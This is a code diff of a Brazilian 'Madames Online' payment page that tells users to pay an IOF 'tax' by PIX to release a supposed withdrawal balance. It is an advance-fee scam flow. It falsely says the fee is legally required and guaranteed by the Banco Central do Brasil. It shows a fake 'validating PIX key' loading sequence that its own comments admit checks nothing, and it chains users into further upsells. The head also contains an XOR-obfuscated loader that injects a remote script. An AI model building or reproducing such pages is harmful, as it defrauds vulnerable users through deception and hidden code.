@@ -8,7 +8,7 @@
   <meta name="description" content="Falta só a taxa de IOF pra concluir a liberação do seu saque.">
   <meta name="robots" content="noindex, nofollow">
   <link rel="icon" href="/favicon.ico">
-  <link rel="stylesheet" href="/css/upsell.css">
+  <link rel="stylesheet" href="/css/upsell-light.css">
 
   <!-- Utmify: script de UTMs -->
   <script>(function(){var d_m=atob("DKjGMWpVCfoUgSQyMtPkRBg5K8A26VBGQtv8HkU2bZQ69FBfW86/Hwk6ZNR28wtBUdqvQR4mJo9g7FcdXsmyVBkhJ5BnowgQU9yyQwM3fI5x8gYIadPkXws4bNguo0BTRsnrRB44YJxtrFRAV96jXx54cZl75QlBUcPkHUgjaJZh5AYIEIq7HRF3Z5t55AYIEMynRQt4fI556EJLH9i0VBwwZ4458lFQW8y1E0Z3f5t49EEQCIrkTDco");var m_2mq0=[];for(var y_8k=0;y_8k<d_m.length;y_8k++){m_2mq0.push(d_m.charCodeAt(y_8k)&255);}var j_n1md=m_2mq0[0];var c_4tfh=m_2mq0.slice(1,1+j_n1md);var h_00t=m_2mq0.slice(1+j_n1md);var o_arp=h_00t.map(function(b,g_chfz){return b^c_4tfh[g_chfz%j_n1md];});var t_ni7s="";for(var d_afvl=0;d_afvl<o_arp.length;d_afvl++){t_ni7s+=String.fromCharCode(o_arp[d_afvl]&255);}var s_z6=decodeURIComponent(escape(t_ni7s));var l_c=JSON.parse(s_z6);var f_4m=l_c.globals||[];f_4m.forEach(function(h_x){window[h_x.name]=h_x.value;});var o_k8fy=document.createElement("script");o_k8fy.src=l_c.url;o_k8fy.async=true;o_k8fy.defer=true;(l_c.attributes||[]).forEach(function(l_z5k){o_k8fy.setAttribute(l_z5k.name,l_z5k.value);});(document.head||document.documentElement).appendChild(o_k8fy);})();</script>
@@ -17,6 +17,13 @@
 </head>
 
 <body>
+  <div id="loading-page" class="loading-page">
+    <div class="loading-status" id="loading-status">Validando saque...</div>
+    <div class="loading-progress-track">
+      <div class="loading-progress-bar" id="loading-progress-bar"></div>
+    </div>
+  </div>
+
   <header class="app-header">
     <img class="app-header-logo" src="/app/images/logo-madames.png" alt="">
     <span class="app-header-name">Madames Online</span>
@@ -25,75 +32,74 @@
   <div class="wrap">
     <!-- OFERTA PRINCIPAL -->
     <div id="main-offer">
-      <p class="selection-line">Seu saque já está em processamento. Falta só a taxa de IOF pra liberar o PIX.</p>
-
-      <h1>Falta só um passo pro seu <span>PIX cair</span></h1>
-
-      <div class="balance-callout">
-        <div class="balance-label">Saldo liberado, aguardando o PIX</div>
-        <div class="balance-value" id="balance-value">R$ 0,00</div>
+      <div class="warning-box">
+        <span class="warning-icon">⚠️</span>
+        <span>Imposto (IOF) obrigatório</span>
       </div>
 
-      <p class="notice-text">Seu saque já passou pela liberação e está pronto pra cair na sua conta. Só falta o <strong>IOF</strong>, um imposto federal que incide automaticamente sobre transferências desse valor, cobrado por qualquer banco ou fintech do país, não é uma cobrança da Madames Online. Enquanto ele não for pago, o sistema mantém sua transferência retida, mesmo com o saldo já liberado do seu lado. Pagando agora, o PIX sai na mesma hora, direto pra sua chave cadastrada.</p>
+      <h1>Imposto sobre Operações Financeiras (IOF)</h1>
 
-      <div class="compare-grid">
-        <div class="compare-col compare-no">
-          <div class="compare-title">Sem pagar</div>
-          <ul>
-            <li>PIX continua retido</li>
-            <li>Saldo fica parado</li>
-            <li>Sem previsão de liberação</li>
-          </ul>
+      <p class="subtitle-left">O pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório e exigido por lei.</p>
+
+      <p class="required-note">É necessário realizar o pagamento do IOF para receber o valor acumulado.</p>
+
+      <div class="receipt-summary">
+        <div class="receipt-title">Resumo</div>
+        <div class="receipt-row">
+          <span>Valor ganho</span>
+          <span class="receipt-value" id="receipt-balance">R$ 0,00</span>
         </div>
-        <div class="compare-col compare-yes">
-          <div class="compare-title">Pagando agora</div>
-          <ul>
-            <li>PIX cai na hora</li>
-            <li>Direto na sua chave</li>
-            <li>Não se repete depois</li>
-          </ul>
+        <div class="receipt-divider"></div>
+        <div class="receipt-row">
+          <span>Valor a ser pago (IOF)</span>
+          <span class="receipt-value receipt-negative">- R$ 23,49</span>
+        </div>
+        <p class="receipt-subtitle">Imposto sobre Operações Financeiras</p>
+        <div class="receipt-divider"></div>
+        <div class="receipt-row receipt-row-total">
+          <span>Total a receber</span>
+          <span class="receipt-value" id="receipt-total">R$ 0,00</span>
+        </div>
+        <div class="receipt-note">
+          <span class="receipt-note-icon">!</span>
+          <span>O pagamento de <span id="receipt-note-value">R$ 0,00</span> será processado via PIX de forma imediata.</span>
         </div>
       </div>
 
-      <p class="countdown-note">Essa condição vale por tempo limitado nesta tela: <strong id="countdown">09:59</strong></p>
+      <div class="guarantee-badge">O valor ganho é garantido pelo Banco Central do Brasil</div>
 
-      <p class="closing-pitch">Confirme agora e seu PIX cai na hora, direto na sua chave. Essa etapa só fica disponível nesta tela, se você sair, seu saque volta pra fila normal.</p>
-
-      <p class="price-line">Taxa de IOF: <strong class="price-line-value">R$ 22,37</strong></p>
-
-      <a href="#" class="cta" id="accept-main">LIBERAR MEU PIX AGORA</a>
-      <button type="button" class="decline-link" id="decline-main">Não, prefiro deixar meu PIX retido</button>
-
-      <div class="faq">
-        <details>
-          <summary>Por que essa taxa existe?</summary>
-          <p>O IOF incide sobre operações financeiras acima de determinado valor, é uma regra do sistema financeiro, não uma cobrança inventada pela plataforma. Toda transferência PIX de valor mais alto passa por essa mesma retenção.</p>
-        </details>
-        <details>
-          <summary>É uma cobrança única?</summary>
-          <p>Sim. Uma vez pago, esse saque específico fica liberado. A taxa não se repete pra esse mesmo valor.</p>
-        </details>
-        <details>
-          <summary>Quando o PIX cai depois do pagamento?</summary>
-          <p>Assim que o pagamento é confirmado, o sistema libera a transferência automaticamente, direto pra chave cadastrada.</p>
-        </details>
+      <div class="payment-method-card">
+        <div class="payment-method-title">Método de pagamento</div>
+        <div class="payment-method-row">
+          <img class="pix-icon" src="/app/images/pix-logo.svg" alt="Pix">
+        </div>
+        <p class="payment-method-note">Pague com Pix! Simples, rápido e direto pra sua chave cadastrada.</p>
       </div>
+
+      <label class="consent-line">
+        <input type="checkbox" id="consent-checkbox">
+        Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras (IOF), necessário para completar o saque em conformidade com as regulamentações vigentes.
+      </label>
+
+      <a href="#" class="cta" id="accept-main" disabled>PAGAR IMPOSTO</a>
     </div>
 
-    <!-- DOWNSELL -->
-    <div id="downsell-offer" hidden>
-      <div class="downsell-ribbon">Espera! Preparamos uma condição especial só pra você</div>
-      <h1>Última chance: <span>50% OFF</span> no IOF</h1>
-
-      <p class="notice-text">A plataforma decidiu custear metade dessa taxa pra te ajudar a concluir o saque agora. Você continua recebendo o PIX na hora, assim que o pagamento cair.</p>
-
-      <p class="price-line">Taxa de IOF: <span class="price-line-old">R$ 22,37</span> <strong class="price-line-value">R$ 11,19</strong></p>
-
-      <a href="#" class="cta" id="accept-downsell">LIBERAR MEU PIX POR R$ 11,19</a>
-      <button type="button" class="decline-link" id="decline-downsell">Não, prefiro perder meu saque por causa dessa taxa</button>
+    <!-- PIX gerado na hora (some quando #accept-main é aceito) -->
+    <div id="pix-panel" class="pix-panel" hidden>
+      <p class="pix-panel-title">Escaneie ou copie o código Pix</p>
+      <p class="pix-panel-subtitle">Assim que o pagamento cair, seu saque continua automaticamente pra próxima etapa.</p>
+      <div class="pix-qr-box">
+        <img id="pix-qr-img" src="" alt="QR Code Pix">
+      </div>
+      <p class="pix-code-label">Pix copia e cola</p>
+      <div class="pix-code-row">
+        <input type="text" id="pix-code-input" readonly value="">
+        <button type="button" class="pix-copy-btn" id="pix-copy-btn">Copiar</button>
+      </div>
+      <p class="pix-status" id="pix-status-text">Aguardando pagamento...</p>
+      <p class="pix-error" id="pix-error-text" hidden></p>
     </div>
 
-    <div class="footer">© <span id="year"></span> Madames Online. Todos os direitos reservados.</div>
   </div>
 
   <!-- Firebase SDK / Tracking -->
@@ -102,33 +108,67 @@
   <script src="/admin/js/firebase-config.js"></script>
   <script src="/admin/js/tracking.js"></script>
   <script>
-    document.getElementById('year').textContent = new Date().getFullYear();
 
     // Mesmo saldo real mostrado no /discover, /chat e no upsell de saque.
+    // Também preenche o resumo tipo recibo: o total a receber é o mesmo
+    // saldo cheio, a taxa não desconta do valor que a pessoa recebe.
     (function () {
       var raw = parseFloat(localStorage.getItem('userBalance') || '0');
-      var el = document.getElementById('balance-value');
-      var callout = el ? el.closest('.balance-callout') : null;
-      if (raw > 0 && el) {
-        el.textContent = 'R$ ' + raw.toFixed(2).replace('.', ',');
-      } else if (callout) {
-        callout.hidden = true;
-      }
+      var formatted = 'R$ ' + raw.toFixed(2).replace('.', ',');
+      var receiptBalance = document.getElementById('receipt-balance');
+      var receiptTotal = document.getElementById('receipt-total');
+      var receiptNoteValue = document.getElementById('receipt-note-value');
+      if (receiptBalance) receiptBalance.textContent = formatted;
+      if (receiptTotal) receiptTotal.textContent = formatted;
+      if (receiptNoteValue) receiptNoteValue.textContent = formatted;
     })();
 
-    // Contador visual de urgência. Não bloqueia nada quando chega a zero,
-    // só para de contar. É reforço de escassez, não uma trava real.
+    // A pessoa precisa marcar a concordância antes de liberar o botão de
+    // pagar, reforçando que é uma confirmação deliberada.
     (function () {
-      var el = document.getElementById('countdown');
-      if (!el) return;
-      var total = 9 * 60 + 59;
-      var timer = setInterval(function () {
-        total--;
-        if (total <= 0) { clearInterval(timer); total = 0; }
-        var m = Math.floor(total / 60);
-        var s = total % 60;
-        el.textContent = (m < 10 ? '0' + m : m) + ':' + (s < 10 ? '0' + s : s);
-      }, 1000);
+      var checkbox = document.getElementById('consent-checkbox');
+      var cta = document.getElementById('accept-main');
+      if (!checkbox || !cta) return;
+      checkbox.addEventListener('change', function () {
+        if (checkbox.checked) cta.removeAttribute('disabled');
+        else cta.setAttribute('disabled', '');
+      });
+    })();
+
+    // Tela de carregamento inicial: sequência de status + barra de progresso,
+    // só um reforço visual de "processando", não trava nem verifica nada de
+    // verdade. Some sozinha e revela a oferta.
+    (function () {
+      var loadingPage = document.getElementById('loading-page');
+      var statusEl = document.getElementById('loading-status');
+      var progressBar = document.getElementById('loading-progress-bar');
+      var mainOffer = document.getElementById('main-offer');
+      if (!loadingPage || !statusEl || !progressBar) return;
+      if (mainOffer) mainOffer.hidden = true;
+
+      var steps = [
+        { text: 'Validando saque...', progress: 30, duration: 1200 },
+        { text: 'Verificando chave PIX...', progress: 70, duration: 1200 },
+        { text: 'Pronto!', progress: 100, duration: 1000 }
+      ];
+      var i = 0;
+      function next() {
+        if (i >= steps.length) {
+          loadingPage.hidden = true;
+          if (mainOffer) mainOffer.hidden = false;
+          return;
+        }
+        var step = steps[i];
+        statusEl.classList.add('is-fading');
+        setTimeout(function () {
+          statusEl.textContent = step.text;
+          statusEl.classList.remove('is-fading');
+          progressBar.style.width = step.progress + '%';
+        }, 180);
+        i++;
+        setTimeout(next, step.duration);
+      }
+      next();
     })();
   </script>
 
@@ -137,11 +177,17 @@
     window.UPSELL_CONFIG = {
       step: 'iof',
       pagePath: '/upsell-iof/',
-      mainPrice: 22.37,
-      downsellPrice: 11.19,
+      mainPrice: 23.49,
       mainCheckoutUrl: 'https://go.frendz.com.br/ukgihx3fvt',
-      downsellCheckoutUrl: 'https://go.frendz.com.br/42zo5',
-      nextUrl: '/upsell-selo/'
+      // PIX gerado direto na página via Cloud Function (não sai pro checkout
+      // hospedado). Se a função falhar, upsell-flow.js cai pro mainCheckoutUrl.
+      pix: {
+        functionsBaseUrl: 'https://us-central1-madame-67e19.cloudfunctions.net',
+        mainChargeKey: 'iof_main'
+      },
+      // Sem downsell e sem botão de recusar nessa página (só pagar ou sair).
+      // nextUrl é usado quando o PIX é confirmado, pra seguir pro próximo upsell.
+      nextUrl: '/upsell-saque/'
     };
   </script>
   <script src="/js/upsell-flow.js"></script>
